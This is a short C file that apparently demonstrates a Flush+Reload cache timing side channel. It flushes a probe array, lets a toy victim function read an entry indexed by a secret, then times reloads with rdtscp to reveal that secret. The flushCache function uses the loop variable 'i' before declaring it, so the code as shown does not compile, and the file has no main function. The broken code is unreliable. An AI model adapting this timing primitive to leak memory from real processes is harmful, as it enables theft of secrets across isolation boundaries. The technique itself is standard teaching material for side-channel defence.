#include <emmintrin.h>
#include <x86intrin.h>
#include <stdint.h>
#include <stdio.h>

#define CACHE_HIT_THRESHOLD (100)
#define DELTA 512

int8_t array[256 * 4096];
int temp;

void flushCache()
{

  array[i * 4096 + DELTA] = 1;

  for (int i = 0; i < 256; i++)
    _mm_clflush(&array[i * 4096 + DELTA]);
}

void victim(char secret)
{
  temp = array[secret * 4096 + DELTA];
}

void reloadCache()
{

  int junk = 0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for (i = 0; i < 256; i++)
  {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD)
      printf("The secret is:%d, array[%d*4096+%d]\n", i, i, DELTA);
  }
}
